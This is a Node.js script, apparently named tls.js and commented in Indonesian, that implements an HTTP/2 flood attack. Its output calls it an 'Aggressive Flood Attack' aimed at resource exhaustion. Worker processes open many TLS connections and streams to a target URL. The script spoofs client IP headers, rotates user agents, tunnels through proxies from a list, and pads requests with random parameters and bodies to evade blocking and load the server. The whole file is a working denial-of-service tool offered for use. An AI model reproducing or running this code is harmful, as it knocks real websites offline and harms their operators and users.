const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://example.com/ 120 50 8`); 
    console.log(`Atau tanpa proxy: node tls.js https://example.com/ 120 50 8 --noproxy`);
    process.exit();
}

const useProxy = process.argv[6] !== "--noproxy";

// Cipher yang lebih agresif
const ciphersTLS12 = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "DHE-RSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384"
].join(":");

const ecdhCurve = "x25519:secp256r1:secp384r1:secp521r1";

const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_NO_RENEGOTIATION;

const secureContextOptions = {
    ciphers: ciphersTLS12,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
};

const secureContext = tls.createSecureContext(secureContextOptions);

var proxies = [];
if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
        console.log(`📡 Loaded ${proxies.length} proxies`);
    } catch(e) {
        console.log(`⚠️  No proxy.txt found, using direct connection`);
    }
}

// User Agents yang lebih banyak
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

let stats = {
    total: 0,
    success: 0,
    blocked: 0,
    error: 0,
    active: 0,
    http508: 0
};

if (cluster.isMaster) {
    console.log(`🔥 Starting Aggressive Flood Attack`);
    console.log(`🎯 Target: ${args.target}`);
    console.log(`⏱️  Duration: ${args.time} seconds`);
    console.log(`⚡ Rate: ${args.Rate} req/sec per connection`);
    console.log(`🧵 Threads: ${args.threads}`);
    console.log(`🔒 TLS Version: 1.2 & 1.3`);
    console.log(`🌐 Proxy Mode: ${useProxy ? "Enabled" : "Disabled"}`);
    console.log(`🎯 Goal: HTTP 508 & Resource Exhaustion`);
    console.log(`====================================`);
    
    const statsInterval = setInterval(() => {
        console.log(`\n📊 STATS UPDATE [${new Date().toLocaleTimeString()}]:`);
        console.log(`   Total: ${stats.total}`);
        console.log(`   ✅ 2xx: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   🚫 4xx/5xx: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   🔴 HTTP 508: ${stats.http508} (${((stats.http508/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   ❌ Error: ${stats.error}`);
        console.log(`   🔗 Active: ${stats.active}`);
    }, 3000);
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log(`\n✅ Attack Finished!`);
        console.log(`📊 Final Stats:`);
        console.log(`   Total Requests: ${stats.total}`);
        console.log(`   ✅ Success (2xx): ${stats.success}`);
        console.log(`   🚫 Blocked (4xx/5xx): ${stats.blocked}`);
        console.log(`   🔴 HTTP 508 (Loop Detected): ${stats.http508}`);
        console.log(`   ❌ Connection Errors: ${stats.error}`);
        
        if (stats.http508 > 0) {
            console.log(`\n🎯 TARGET ACHIEVED! Server returned HTTP 508`);
            console.log(`   Server is in a loop or resource exhausted!`);
        }
        process.exit(1);
    }, args.time * 1000);
} else {
    console.log(`Worker ${cluster.worker.id} started - Aggressive Mode`);
    
    // Multiple intervals dengan rate lebih tinggi
    const intervalsPerWorker = Math.min(2000, args.Rate * 2);
    for (let i = 0; i < intervalsPerWorker; i++) {
        setTimeout(() => {
            setInterval(() => {
                if (stats.active < 20000) { // Meningkatkan batas aktif
                    runFlooder();
                }
            }, Math.max(5, Math.floor(1000 / (args.Rate / intervalsPerWorker))));
        }, i * 1);
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    if (!elements || elements.length === 0) return "";
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomIP() {
    return randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255);
}

// Header khusus untuk menyebabkan loop/infinite redirect
function createLoopHeaders(path, depth = 0) {
    const headers = {
        [":method"]: Math.random() > 0.7 ? "POST" : "GET",
        [":path"]: path,
        [":scheme"]: "https",
        [":authority"]: parsedTarget.host,
        "user-agent": randomElement(userAgents),
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache, no-store, must-revalidate",
        "pragma": "no-cache",
        "referer": "https://" + parsedTarget.host + "/" + randomString(10),
        "x-forwarded-for": randomIP(),
        "x-real-ip": randomIP(),
        "x-original-url": "https://" + parsedTarget.host + "/" + randomString(20),
        "forwarded": "for=" + randomIP() + ";proto=https",
        "connection": "keep-alive",
        "keep-alive": "timeout=9999, max=1000"
    };
    
    // Tambahkan header untuk membuat loop
    if (depth > 0) {
        headers["x-redirect-depth"] = depth.toString();
        headers["x-forwarded-host"] = parsedTarget.host;
        headers["x-original-host"] = parsedTarget.host;
        headers["x-proxy-host"] = parsedTarget.host;
    }
    
    // Header untuk inflate request
    if (Math.random() > 0.5) {
        headers["content-length"] = randomIntn(1000, 50000).toString();
        headers["x-custom-header"] = randomString(100);
        headers["x-request-id"] = crypto.randomBytes(16).toString("hex");
    }
    
    return headers;
}

function runFlooder() {
    stats.active++;
    
    const makeRequest = (proxyConn, retryCount = 0) => {
        const settings = {
            enablePush: true,
            initialWindowSize: 2147483647,
            maxConcurrentStreams: 2000, // Meningkatkan concurrent streams
            maxHeaderListSize: 262144,
            maxFrameSize: 16777215
        };

        const tlsOptions = {
            port: 443,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ciphersTLS12,
            requestCert: false,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: true,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureContext: secureContext,
            servername: parsedTarget.host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            sessionTimeout: 300000,
            ticketKeys: crypto.randomBytes(48)
        };

        if (proxyConn) {
            tlsOptions.socket = proxyConn;
        }

        const tlsConn = proxyConn ? 
            tls.connect(443, parsedTarget.host, tlsOptions) :
            tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 30000);
        tlsConn.setMaxListeners(0);
        tlsConn.setTimeout(30000);

        let requestInterval;
        let streamCount = 0;
        
        tlsConn.once("secureConnect", () => {
            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: settings,
                createConnection: () => tlsConn,
                maxSessionMemory: 5000,
                maxDeflateDynamicTableSize: 4294967295,
                maxHeaderListSize: 262144
            });

            client.setMaxListeners(0);
            
            const startTime = Date.now();
            
            requestInterval = setInterval(() => {
                const elapsed = Date.now() - startTime;
                if (elapsed > args.time * 1000) {
                    clearInterval(requestInterval);
                    client.destroy();
                    if (proxyConn) proxyConn.destroy();
                    stats.active--;
                    return;
                }
                
                // Buat path yang kompleks untuk menyebabkan loop
                let randomPath;
                const pathType = Math.random();
                
                if (pathType < 0.3) {
                    // Path dengan redirect loop
                    randomPath = parsedTarget.path + 
                        "?redirect=" + randomString(10) +
                        "&loop=true&depth=" + randomIntn(1, 20) +
                        "&callback=" + randomString(15);
                } else if (pathType < 0.6) {
                    // Path dengan banyak parameter
                    let params = [];
                    for (let i = 0; i < randomIntn(10, 50); i++) {
                        params.push(randomString(5) + "=" + randomString(10));
                    }
                    randomPath = parsedTarget.path + "?" + params.join("&");
                } else {
                    // Path dengan nested structure
                    let nestedPath = parsedTarget.path;
                    for (let i = 0; i < randomIntn(3, 10); i++) {
                        nestedPath += randomString(5) + "/";
                    }
                    randomPath = nestedPath;
                }
                
                const headers = createLoopHeaders(randomPath, randomIntn(0, 15));
                
                try {
                    // Kirim multiple streams dalam satu koneksi
                    const numStreams = randomIntn(1, 5);
                    for (let s = 0; s < numStreams; s++) {
                        streamCount++;
                        
                        const request = client.request(headers);
                        
                        // Kirim data untuk POST request
                        if (headers[":method"] === "POST") {
                            const bodyData = Buffer.alloc(randomIntn(1024, 10240), randomString(100));
                            request.write(bodyData);
                        }
                        
                        request.on("response", (responseHeaders) => {
                            const statusCode = responseHeaders[":status"];
                            stats.total++;
                            
                            if (statusCode === 200 || statusCode === 201 || statusCode === 301 || statusCode === 302) {
                                stats.success++;
                            } else if (statusCode === 508) {
                                stats.http508++;
                                stats.blocked++;
                                console.log(`🎯 HTTP 508 Detected! Server is in a loop!`);
                            } else if (statusCode === 403 || statusCode === 429 || statusCode === 503) {
                                stats.blocked++;
                            } else if (statusCode >= 500) {
                                stats.error++;
                            } else {
                                stats.success++;
                            }
                            
                            request.close();
                            request.destroy();
                        });
                        
                        request.on("error", (err) => {
                            stats.total++;
                            stats.error++;
                        });
                        
                        request.end();
                    }
                } catch(e) {
                    stats.total++;
                    stats.error++;
                }
            }, Math.max(1, Math.floor(1000 / args.Rate)));
            
            client.requestInterval = requestInterval;
        });

        tlsConn.on("error", (err) => {
            if (requestInterval) clearInterval(requestInterval);
            if (proxyConn) proxyConn.destroy();
            stats.active--;
        });
        
        tlsConn.on("timeout", () => {
            if (requestInterval) clearInterval(requestInterval);
            tlsConn.destroy();
            if (proxyConn) proxyConn.destroy();
            stats.active--;
        });
        
        if (proxyConn) {
            proxyConn.on("error", () => {
                if (requestInterval) clearInterval(requestInterval);
                tlsConn.destroy();
                stats.active--;
            });
            
            proxyConn.on("close", () => {
                if (requestInterval) clearInterval(requestInterval);
                stats.active--;
            });
        }
        
        tlsConn.on("close", () => {
            if (requestInterval) clearInterval(requestInterval);
            stats.active--;
        });
    };
    
    if (useProxy && proxies.length > 0) {
        const proxyAddr = randomElement(proxies);
        if (proxyAddr) {
            const parsedProxy = proxyAddr.split(":");
            if (parsedProxy.length >= 2) {
                const proxyConn = net.connect({
                    host: parsedProxy[0],
                    port: ~~parsedProxy[1],
                    allowHalfOpen: true
                });
                
                proxyConn.setTimeout(10000);
                proxyConn.setKeepAlive(true, 30000);
                
                // Payload dengan header tambahan
                const payload = "CONNECT " + parsedTarget.host + ":443 HTTP/1.1\r\n" +
                    "Host: " + parsedTarget.host + "\r\n" +
                    "User-Agent: " + randomElement(userAgents) + "\r\n" +
                    "Proxy-Connection: Keep-Alive\r\n" +
                    "X-Forwarded-For: " + randomIP() + "\r\n\r\n";
                
                proxyConn.on("connect", () => {
                    proxyConn.write(payload);
                });
                
                proxyConn.on("data", (chunk) => {
                    const response = chunk.toString();
                    if (response.includes("200 Connection established") || 
                        response.includes("HTTP/1.1 200") ||
                        response.includes("HTTP/1.0 200")) {
                        proxyConn.removeAllListeners("data");
                        makeRequest(proxyConn);
                    } else {
                        proxyConn.destroy();
                        stats.active--;
                    }
                });
                
                proxyConn.on("error", () => {
                    stats.active--;
                });
                
                proxyConn.on("timeout", () => {
                    proxyConn.destroy();
                    stats.active--;
                });
                
                return;
            }
        }
    }
    
    makeRequest(null);
}

process.on('uncaughtException', (error) => {
    if (stats.active > 0) stats.active--;
});
process.on('unhandledRejection', (error) => {});